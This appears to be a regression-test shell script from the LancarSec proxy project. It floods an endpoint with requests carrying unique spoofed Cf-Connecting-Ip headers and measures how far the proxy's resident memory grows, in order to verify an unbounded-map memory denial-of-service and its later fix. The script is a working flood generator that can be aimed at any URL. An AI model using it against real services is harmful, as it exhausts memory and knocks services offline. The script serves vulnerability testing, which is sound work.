#!/bin/sh
#
# memgrowth.sh -- direct measurement of the unbounded-map memory DoS.
#
# LancarSec's sliding-window ratelimit maps (firewall.WindowAccessIps,
# WindowAccessIpsCookie, WindowUnkFps and the derived AccessIps / AccessIpsCookie
# / UnkFps) are keyed by the client IP. In Cloudflare mode that IP is taken
# verbatim from the attacker-controlled Cf-Connecting-Ip header
# (core/server/middleware.go: `ip = request.Header.Get("Cf-Connecting-Ip")`).
# There is no cap on the number of distinct keys. So an attacker who sends a
# fresh Cf-Connecting-Ip on every request forces a new map entry every time, and
# those entries live for the whole ratelimit window (default 120s) before the
# monitor thread sweeps them. Resident memory climbs for as long as the attack
# lasts.
#
# This script sends a UNIQUE Cf-Connecting-Ip per request for a fixed duration
# and records the RSS of the LancarSec process over time. The output is the RSS
# slope: KiB gained per second. TODAY that slope is clearly positive. Waves 6
# and 7 add a cardinality cap; after them this slope should be ~flat.
#
# Preferred generator is vegeta (a targets file gives a genuinely distinct
# header on every request). If vegeta is absent the script falls back to a
# built-in curl loop -- slower, so fewer distinct IPs per second, but it needs
# no extra tooling and still demonstrates the climb.
#
# POSIX sh. Works from Git Bash on Windows and from Linux.

set -eu

PROG=memgrowth.sh

URL=http://127.0.0.1/bench
HOST=bench.local
DURATION=60
RATE=5000 # requests/sec target (vegeta); curl fallback goes as fast as it can
CONNS=50
PROC_NAME=lancarsec
PROC_PID=""
SAMPLE_INTERVAL=1
OUTDIR=./hack-results
GENERATOR=""

usage() {
	cat <<EOF
Usage: $PROG [options]

  -u URL        target URL                          (default $URL)
  -H HOST       Host header                         (default $HOST)
  -d SECONDS    attack duration                     (default $DURATION)
  -r RATE       requests/sec target, vegeta only    (default $RATE)
  -c N          concurrent workers                  (default $CONNS)
  -p PID        LancarSec process id to sample      (default: auto-detect)
  -n NAME       process name for auto-detect        (default $PROC_NAME)
  -g GENERATOR  force 'vegeta' or 'curl'            (default: vegeta else curl)
  -o DIR        output directory                    (default $OUTDIR)
  -h            this help

Every request carries a distinct Cf-Connecting-Ip. That header is the attack
surface: it is the map key, and it is fully attacker-controlled.
EOF
}

while [ $# -gt 0 ]; do
	case $1 in
	-u) URL=${2:?}; shift 2 ;;
	-H) HOST=${2:?}; shift 2 ;;
	-d) DURATION=${2:?}; shift 2 ;;
	-r) RATE=${2:?}; shift 2 ;;
	-c) CONNS=${2:?}; shift 2 ;;
	-p) PROC_PID=${2:?}; shift 2 ;;
	-n) PROC_NAME=${2:?}; shift 2 ;;
	-g) GENERATOR=${2:?}; shift 2 ;;
	-o) OUTDIR=${2:?}; shift 2 ;;
	-h) usage; exit 0 ;;
	*) printf '%s: unknown option: %s\n\n' "$PROG" "$1" >&2; usage >&2; exit 2 ;;
	esac
done

die() { printf '%s: error: %s\n' "$PROG" "$*" >&2; exit 1; }
note() { printf '%s: %s\n' "$PROG" "$*" >&2; }

need() { command -v "$1" >/dev/null 2>&1 || die "required command not found: $1"; }
need curl
need awk
need sed

case $DURATION in '' | *[!0-9]*) die "-d must be a whole number of seconds" ;; esac
[ "$DURATION" -gt 0 ] || die "-d must be greater than zero"

case "$(uname -s 2>/dev/null || echo unknown)" in
MINGW* | MSYS* | CYGWIN*) OS_KIND=windows ;;
*) OS_KIND=unix ;;
esac

PS_EXE=""
if [ "$OS_KIND" = windows ]; then
	if command -v powershell >/dev/null 2>&1; then PS_EXE=powershell
	elif command -v pwsh >/dev/null 2>&1; then PS_EXE=pwsh
	fi
fi

rss_kb() {
	_pid=$1
	if [ "$OS_KIND" = windows ]; then
		if [ -n "$PS_EXE" ]; then
			"$PS_EXE" -NoProfile -NonInteractive -Command \
				"\$p = Get-Process -Id $_pid -ErrorAction SilentlyContinue; if (\$p) { [int](\$p.WorkingSet64 / 1024) }" \
				2>/dev/null | tr -d '\r\n '
		else
			tasklist //FI "PID eq $_pid" //NH //FO CSV 2>/dev/null |
				sed -n 's/.*,"\([0-9.,][0-9.,]*\) K"[[:space:]]*$/\1/p' |
				tr -d '.,' | head -1
		fi
	elif [ -r "/proc/$_pid/status" ]; then
		awk '/^VmRSS:/ { print $2; exit }' "/proc/$_pid/status"
	else
		ps -o rss= -p "$_pid" 2>/dev/null | tr -d ' '
	fi
}

detect_pid() {
	_name=$1
	if [ "$OS_KIND" = windows ]; then
		tasklist //FI "IMAGENAME eq ${_name}.exe" //NH //FO CSV 2>/dev/null |
			sed -n 's/^"[^"]*","\([0-9][0-9]*\)".*/\1/p' | head -1
	elif command -v pgrep >/dev/null 2>&1; then
		pgrep -x "$_name" 2>/dev/null | head -1
	fi
}

# choose generator
if [ -z "$GENERATOR" ]; then
	if command -v vegeta >/dev/null 2>&1; then GENERATOR=vegeta; else GENERATOR=curl; fi
fi
case $GENERATOR in
vegeta) command -v vegeta >/dev/null 2>&1 || die "vegeta requested but not on PATH (go install github.com/tsenart/vegeta/v12@latest)" ;;
curl) note "vegeta not found; using the built-in curl loop (lower request rate, still unique per request). For higher rates install vegeta: go install github.com/tsenart/vegeta/v12@latest" ;;
*) die "-g must be 'vegeta' or 'curl'" ;;
esac

# locate the process to sample
[ -n "$PROC_PID" ] || PROC_PID=$(detect_pid "$PROC_NAME" || true)
[ -n "$PROC_PID" ] || die "could not find the LancarSec process. Pass -p PID."
FIRST=$(rss_kb "$PROC_PID")
[ -n "$FIRST" ] || die "could not read RSS for pid $PROC_PID."

mkdir -p "$OUTDIR"
STAMP=$(date +%Y%m%d-%H%M%S)
RUNDIR=$OUTDIR/memgrowth-$STAMP
mkdir -p "$RUNDIR"
RSS_FILE=$RUNDIR/rss.txt
: >"$RSS_FILE"

note "target        $URL (Host: $HOST)"
note "generator     $GENERATOR"
note "duration      ${DURATION}s"
note "sampling pid  $PROC_PID (start ${FIRST} KiB)"
note "output        $RUNDIR"

# preflight: one distinct IP, must proxy (200), not challenge (302) or 404.
PRE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 \
	-H "Host: $HOST" -H "Cf-Connecting-Ip: 10.0.0.1" "$URL") ||
	die "preflight request failed -- is LancarSec running on :80?"
case $PRE in
200) : ;;
302) die "preflight got 302 (challenge path). Point -u at a path whitelisted with action \"0\"; hack/config.test.json ships /bench." ;;
404) die "preflight got 404 (no domain for Host: $HOST)." ;;
*) die "preflight got HTTP $PRE, expected 200." ;;
esac

# ------------------------------------------------------------ rss sampler ---

STOPFLAG=$RUNDIR/.sampling
: >"$STOPFLAG"
(
	_t0=$(date +%s)
	while [ -e "$STOPFLAG" ]; do
		_kb=$(rss_kb "$PROC_PID")
		if [ -n "$_kb" ]; then
			printf '%s %s\n' "$(($(date +%s) - _t0))" "$_kb" >>"$RSS_FILE"
		fi
		sleep "$SAMPLE_INTERVAL"
	done
) &
SAMPLER_PID=$!

ATTACK_PID=""
cleanup() {
	rm -f "$STOPFLAG" 2>/dev/null || true
	if [ -n "$ATTACK_PID" ]; then kill "$ATTACK_PID" 2>/dev/null || true; fi
	if [ -n "$SAMPLER_PID" ]; then kill "$SAMPLER_PID" 2>/dev/null || true; fi
}
trap cleanup EXIT INT TERM

# ----------------------------------------------------------------- attack ---
#
# Every request's Cf-Connecting-Ip is a dotted-quad derived from a monotonic
# counter, walking 10.0.0.0/8-ish space so consecutive requests never repeat an
# IP. ~24 usable bits is 16.7M distinct addresses -- more than any single run
# will send.

start=$(date +%s)
deadline=$((start + DURATION))

if [ "$GENERATOR" = vegeta ]; then
	# Size the targets file so the whole run's requests are distinct: one entry
	# per expected request, capped so we never write an absurd file.
	want=$((RATE * DURATION))
	[ "$want" -gt 0 ] || want=$((DURATION * 1000))
	[ "$want" -le 4000000 ] || want=4000000

	TARGETS=$RUNDIR/targets.txt
	note "generating $want unique targets ..."
	awk -v n="$want" -v url="$URL" -v host="$HOST" 'BEGIN {
		for (k = 1; k <= n; k++) {
			a = 10 + int(k / 16777216) % 6
			b = int(k / 65536) % 256
			c = int(k / 256) % 256
			d = k % 256
			printf "GET %s\nHost: %s\nCf-Connecting-Ip: %d.%d.%d.%d\n\n", url, host, a, b, c, d
		}
	}' >"$TARGETS"

	note "attacking for ${DURATION}s at ${RATE} req/s ..."
	vegeta attack -targets="$TARGETS" -duration="${DURATION}s" \
		-rate="$RATE" -max-workers="$CONNS" -timeout=10s -keepalive \
		-output="$RUNDIR/results.bin" &
	ATTACK_PID=$!
	wait "$ATTACK_PID" || note "vegeta exited non-zero (some requests may have errored under load)"
	ATTACK_PID=""
	if command -v vegeta >/dev/null 2>&1 && [ -s "$RUNDIR/results.bin" ]; then
		vegeta report -type=text "$RUNDIR/results.bin" >"$RUNDIR/attack-report.txt" 2>/dev/null || true
	fi
else
	# curl fallback: a tight loop, unique IP each iteration, reusing a single
	# connection is not possible across distinct -H values in one curl call, so
	# we batch many URLs per curl process to amortise startup.
	note "attacking for ${DURATION}s with the curl loop ..."
	sent=0
	k=0
	while [ "$(date +%s)" -lt "$deadline" ]; do
		# Build a batch of distinct requests for one curl invocation.
		args=""
		batch=0
		while [ "$batch" -lt 200 ]; do
			k=$((k + 1))
			a=$((10 + (k / 16777216) % 6))
			b=$(((k / 65536) % 256))
			c=$(((k / 256) % 256))
			d=$((k % 256))
			args="$args -H Host:$HOST -H Cf-Connecting-Ip:$a.$b.$c.$d $URL"
			batch=$((batch + 1))
		done
		# shellcheck disable=SC2086
		curl -s -o /dev/null --max-time 10 $args || true
		sent=$((sent + batch))
	done
	note "curl loop sent ~$sent requests"
fi

# give the process a moment to settle allocations, then stop sampling
sleep 2
rm -f "$STOPFLAG"
wait "$SAMPLER_PID" 2>/dev/null || true
SAMPLER_PID=""

# ----------------------------------------------------------------- report ---

[ -s "$RSS_FILE" ] || die "no RSS samples collected"

# Least-squares slope (KiB/s) plus start/peak/end.
STATS=$(awk '
	{ t = $1; y = $2; n++; sx += t; sy += y; sxx += t*t; sxy += t*y
	  if (n == 1) { start = y; mint = t }
	  if (y > peak) peak = y
	  end = y; endt = t }
	END {
		if (n < 2) { print start, peak, end, "NA", n; exit }
		slope = (n*sxy - sx*sy) / (n*sxx - sx*sx)
		printf "%d %d %d %.2f %d\n", start, peak, end, slope, n
	}' "$RSS_FILE")

RSS_START=$(echo "$STATS" | awk '{print $1}')
RSS_PEAK=$(echo "$STATS" | awk '{print $2}')
RSS_END=$(echo "$STATS" | awk '{print $3}')
SLOPE=$(echo "$STATS" | awk '{print $4}')
SAMPLES=$(echo "$STATS" | awk '{print $5}')
GROWTH=$((RSS_END - RSS_START))

CSV=$OUTDIR/memgrowth.csv
if [ ! -f "$CSV" ]; then
	echo "timestamp,generator,duration_s,rate,samples,rss_start_kib,rss_peak_kib,rss_end_kib,growth_kib,slope_kib_per_s" >"$CSV"
fi
printf '%s,%s,%s,%s,%s,%s,%s,%s,%s,%s\n' \
	"$STAMP" "$GENERATOR" "$DURATION" "$RATE" "$SAMPLES" \
	"$RSS_START" "$RSS_PEAK" "$RSS_END" "$GROWTH" "$SLOPE" >>"$CSV"

cat <<EOF

=============================== memgrowth.sh ==============================
 generator        $GENERATOR
 duration         ${DURATION}s      samples $SAMPLES
 unique IP/req    yes (Cf-Connecting-Ip, the attacker-controlled map key)
---------------------------------------------------------------------------
 RSS start        $RSS_START KiB
 RSS peak         $RSS_PEAK KiB
 RSS end          $RSS_END KiB
 net growth       $GROWTH KiB
 slope            $SLOPE KiB/s
---------------------------------------------------------------------------
 INTERPRETATION
   TODAY (waves 1-5): slope is clearly positive -- RSS climbs the whole run
     because every distinct Cf-Connecting-Ip adds an unbounded map entry that
     survives the ratelimit window. That positive slope IS the vulnerability.
   AFTER waves 6-7: the map gains a cardinality cap. Re-run this unchanged;
     the slope should collapse toward ~0 (allocator noise only). A near-zero
     slope here is the proof those waves worked.
---------------------------------------------------------------------------
 rss samples      $RSS_FILE
 appended to      $CSV
===========================================================================
EOF
